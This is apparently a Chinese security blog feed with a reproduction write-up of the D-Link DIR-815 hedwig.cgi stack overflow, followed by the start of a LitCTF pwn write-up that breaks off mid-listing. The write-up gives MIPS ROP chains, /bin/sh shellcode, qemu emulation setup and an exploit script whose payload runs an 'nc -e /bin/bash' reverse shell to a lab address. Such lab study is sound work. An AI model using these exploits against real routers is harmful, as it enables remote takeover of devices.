class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s0</span></span><br><span class="line">payload+=p32(libc_base + <span class="number">0x436D0</span>) <span class="comment">#s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s2</span></span><br><span class="line">payload+=p32(libc_base + <span class="number">0x56BD0</span>) <span class="comment">#s3  sleep</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s5</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s6</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s7</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s8</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x57E50</span>) <span class="comment">#ra  li $a0,1 | jalr  $s1</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>            <span class="comment">#s0</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>            <span class="comment">#s1</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>            <span class="comment">#s2</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>            <span class="comment">#s3</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x57E50</span>) <span class="comment">#s4  li $a0,1 | jalr  $s1</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x13F74</span>) <span class="comment">#second ra addiu $s1,$sp,0x28+var_10  |  jalr  $s4</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a2, $zero, -1</span></span><br><span class="line"><span class="string">    li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">    sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">    li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">    sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">    sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">    la $a0, -12($sp)</span></span><br><span class="line"><span class="string">    slti $a1, $zero, -1</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">post_content=<span class="string">&#x27;s1nec-1o=pwner&#x27;</span></span><br><span class="line">payload+=<span class="number">0x18</span>*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+=shellcode</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;uid=&#x27;</span>+payload</span><br><span class="line">io = process(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=11 \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot;</span> + payload + <span class="string">b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;2333&quot; \</span></span><br><span class="line"><span class="string">    ./htdocs/cgibin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line">io.send(post_content)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>此时就成功getshell了</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223746.png" alt="image-20240424195751503" style="zoom:50%;" /><p>但是ZIKH26师傅：这里执行 <code>execve(&quot;/bin/sh&quot;)</code> 成功其实是一种假象，因为固件中的 <code>/bin/sh</code> 链接到了 <code>busybox</code> 上，虽然 <code>busybox</code> 是静态链接，但因为它是 <code>MIPS</code> 架构，导致了我在 <code>x64</code> 上直接执行是失败的。因此我上面是把原本的 <code>sh</code> 给删掉，换成了主机自带的 <code>x64</code> 架构的 <code>sh</code> ，同时还把相应的动态库都放到了当前的 <code>/lib</code> 下面，才算执行成功。不然用原本的 <code>sh</code> 还是执行失败，这么做的目的仅仅是为了证明这种操作理论上是可以拿到 <code>shell</code> 的</p><h2 id="qemu系统模式复现"><a href="#qemu系统模式复现" class="headerlink" title="qemu系统模式复现"></a>qemu系统模式复现</h2><h3 id="实现宿主机与-qemu-的通信"><a href="#实现宿主机与-qemu-的通信" class="headerlink" title="实现宿主机与 qemu 的通信"></a>实现宿主机与 <code>qemu</code> 的通信</h3><p>创建一个 <code>net.sh</code> 脚本，我这里的网卡是 <code>ens33</code> ，如果是 <code>eth0</code> 的话，就把出现的 <code>ens33</code> 换成 <code>eth0</code> 即可，<code>chmod +x net.sh</code> 给文件可执行权限，然后 <code>./net.sh</code> 运行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#sudo ifconfig eth0 down                 # 首先关闭宿主机网卡接口</span></span><br><span class="line">sudo brctl addbr br0                     <span class="comment"># 添加一座名为 br0 的网桥</span></span><br><span class="line">sudo brctl addif br0 ens33                <span class="comment"># 在 br0 中添加一个接口</span></span><br><span class="line">sudo brctl stp br0 off                   <span class="comment"># 如果只有一个网桥，则关闭生成树协议</span></span><br><span class="line">sudo brctl setfd br0 1                   <span class="comment"># 设置 br0 的转发延迟</span></span><br><span class="line">sudo brctl sethello br0 1                <span class="comment"># 设置 br0 的 hello 时间</span></span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     <span class="comment"># 启用 br0 接口</span></span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    <span class="comment"># 启用网卡接口</span></span><br><span class="line">sudo dhclient br0                        <span class="comment"># 从 dhcp 服务器获得 br0 的 IP 地址</span></span><br><span class="line">sudo brctl show br0                      <span class="comment"># 查看虚拟网桥列表</span></span><br><span class="line">sudo brctl showstp br0                   <span class="comment"># 查看 br0 的各接口信息</span></span><br></pre></td></tr></table></figure><p>然后再执行如下几条命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">sudo tunctl -t tap0 -u root              <span class="comment"># 创建一个 tap0 接口，只允许 root 用户访问</span></span><br><span class="line">sudo brctl addif br0 tap0                <span class="comment"># 在虚拟网桥中增加一个 tap0 接口</span></span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    <span class="comment"># 启用 tap0 接口</span></span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure><p>再用下面这个脚本启动</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure><p>这个系统的链接是ZIKH26师傅的链接：<a href="https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9Al04v">https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v提取码：l04v</a></p><p>确保此时的系统可以ping通物理机，以便之后的传输文件</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223747.png" alt="image-20240425215309877" style="zoom: 50%;" /><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223748.png" alt="image-20240425215157154" style="zoom:50%;" /><h4 id="启动-httpd-服务"><a href="#启动-httpd-服务" class="headerlink" title="启动 httpd 服务"></a>启动 <code>httpd</code> 服务</h4><p>在 <code>squashfs-root</code> 的上一级目录中，执行下面的命令， <code>IP</code> 换成 <code>qemu</code> 的。这样可以实现计算机远程之间的文件传输，作用就是把提取出来的文件系统传到 <code>qemu</code> 里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scp -r ./squashfs-root root@10.214.140.139:/root/squashfs-root</span><br></pre></td></tr></table></figure><p>然后在 <code>qemu</code> 中的 <code>squashfs-root</code> 目录下新建一个 <code>http_conf</code> 文件</p><p>写入以下代码（网卡和 <code>IP</code> <code>port</code> 要改成自己的）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  <span class="comment">#开启log</span></span><br><span class="line">ErrorLog /log <span class="comment">#log文件</span></span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName <span class="string">&quot;Linux, HTTP/1.1, &quot;</span></span><br><span class="line">    ServerId <span class="string">&quot;1234&quot;</span></span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0  <span class="comment">#对应qemu仿真路由器系统的网卡</span></span><br><span class="line">    Address 192.168.121.128 <span class="comment">#qemu仿真路由器系统的IP</span></span><br><span class="line">    Port <span class="string">&quot;80&quot;</span> <span class="comment">#对应未被使用的端口</span></span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在物理机上 <code>/opt/tools/mipsel</code> 目录（没有的话就自己创建吧）中新建 <code>init.sh</code> 文件，写入如下配置</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure><p>给这个 <code>init.sh</code> ，可执行权限，然后将其执行</p><p>然后在 <code>qemu</code> 中的 <code>squashfs-root</code> 目录下创建 <code>init.sh</code> 文件，写入下面的内容。给可执行权限，然后执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">cp</span> http_conf /</span><br><span class="line"><span class="built_in">cp</span> sbin/httpd /</span><br><span class="line"><span class="built_in">cp</span> -rf htdocs/ /</span><br><span class="line"><span class="built_in">mkdir</span> /etc_bak</span><br><span class="line"><span class="built_in">cp</span> -r /etc /etc_bak</span><br><span class="line"><span class="built_in">rm</span> /etc/services</span><br><span class="line"><span class="built_in">cp</span> -rf etc/ /</span><br><span class="line"><span class="built_in">cp</span> lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libc.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libgcc_s.so.1  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/ld-uClibc.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libcrypt.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libgcc_s.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">rm</span> -rf /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/sbin/phpcgi</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/sbin/hnap</span><br><span class="line"><span class="built_in">ln</span> -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">ln</span> -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line"><span class="built_in">ln</span> -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure><p>最后进到 <code>/squashfs-root/sbin</code> 目录下，执行 <code>./httpd -f /root/squashfs-root/http_conf</code></p><p>在宿主机中访问 <code>http://10.214.140.139/hedwig.cgi</code> 发现可以正常访问了（如下）</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223749.png" alt="image-20240425215457410"></p><p>这是为了之后的打exp做准备</p><p>开启 <code>httpd</code> 服务后，如果要进行调试则需要下载一个 <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver">gdbserver.mipsle</a> ，然后再用 <code>scp</code> 命令将其上传到 <code>qemu</code> 中的 <code>/root/squashfs-root/</code> 目录下。</p><p>在 <code>qemu</code> 中 <code>/root/squashfs-root/</code> 目录下新建 <code>run.sh</code> 脚本（<code>IP</code> 改成宿主机的，端口）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_LENGTH=<span class="string">&quot;11&quot;</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line"><span class="built_in">export</span> HTTP_COOKIE=<span class="string">&quot;uid=`cat payload`&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_METHOD=<span class="string">&quot;POST&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_URI=<span class="string">&quot;2333&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;winmt=pwner&quot;</span>|./gdbserver.mipsle 10.214.140.140:7788 /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="comment">#echo &quot;winmt=pwner&quot;|/htdocs/web/hedwig.cgi</span></span><br><span class="line"><span class="built_in">unset</span> CONTENT_LENGTH</span><br><span class="line"><span class="built_in">unset</span> CONTENT_TYPE</span><br><span class="line"><span class="built_in">unset</span> HTTP_COOKIE</span><br><span class="line"><span class="built_in">unset</span> REQUEST_METHOD</span><br><span class="line"><span class="built_in">unset</span> REQUEST_URI</span><br></pre></td></tr></table></figure><p>但是这里我报了一个错误，跟ZIKH26师傅一样</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223750.png" alt="image-20240425215625540" style="zoom:50%;" /><p>ZIKH26师傅说可能是pwndbg对数据包的解析（推测</p><p>我原本的想法是将gdb整个的版本降低到对应的版本，但是因为操作问题就搁置了。。。如果有人找到解决方法希望能教一下我（本人纯菜</p><p>这里是直接运行hedwig.cgi的同时还cat &#x2F;proc&#x2F;pid&#x2F;maps得到的内存布局</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223751.png" alt="image-20240425220116640" style="zoom:50%;" /><p>但是不知道为什么我的libc版本好像跟网上的师傅有出入，导致libc基址不一样</p><p>先是<code>nv -lvnp 8888</code>，然后运行以下XP即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.121.128 8888&#x27;</span></span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x2aadc000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x53200</span> - <span class="number">1</span>) <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x169C4</span>) <span class="comment"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x32A98</span>) <span class="comment"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.121.128/hedwig.cgi&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;winmt&quot;</span> : <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;11&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>但是我一直打不通，或许是libc基址的问题。。。。。因为无法调试所以就。。。。。没法子</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DIR-815&quot;&gt;&lt;a href=&quot;#DIR-815&quot; class=&quot;headerlink&quot; title=&quot;DIR-815&quot;&gt;&lt;/a&gt;DIR-815&lt;/h1&gt;&lt;p&gt;仔细研读了winmt师傅和ZIKH26师傅的复现，现在自己来复现一遍&lt;/p&gt;
&lt;h2 id=&quot;漏洞详</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>题录1.1</title>
    <link href="http://s1nec-1o.github.io/2024/05/14/%E9%A2%98%E5%BD%951-01/"/>
    <id>http://s1nec-1o.github.io/2024/05/14/%E9%A2%98%E5%BD%951-01/</id>
    <published>2024-05-14T13:14:41.000Z</published>
    <updated>2024-05-14T13:17:32.664Z</updated>
    
    <content type="html"><![CDATA[<h1 id="刷题记录2"><a href="#刷题记录2" class="headerlink" title="刷题记录2"></a>刷题记录2</h1><h1 id="LitCTF-2023-ezlogin"><a href="#LitCTF-2023-ezlogin" class="headerlink" title="[LitCTF 2023]ezlogin"></a>[LitCTF 2023]ezlogin</h1><p>首先是符号表的恢复，将随便一个libc.so的i64文件，拖到bindiff里，然后import即可恢复大部分的函数</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuffer(off_6B97A8, <span class="number">0LL</span>);</span><br><span class="line">  setbuffer(off_6B97A0, <span class="number">0LL</span>);</span><br><span class="line">  setbuffer(off_6B9798, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( !vlun(&amp;v5, <span class="number">0LL</span>, v3) )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodTime.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">vlun</span><span class="params">(<span class="type">int</span> v5, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">536</span>]; <span class="comment">// [rsp+0h] [rbp-218h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your password:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, v4, <span class="number">0x200</span>uLL) &gt; <span class="number">0x50</span>u )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  j_strcpy(*&amp;v5, v4);                           <span class="comment">// v5=v4</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(v4, <span class="string">&quot;PASSWORD&quot;</span>) == <span class="number">0</span>;           <span class="comment">// 不成立</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现v5处有个栈溢出，可以实现ret2syscall</p><p>其中的限制read发现汇编</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400C07 3C 50                         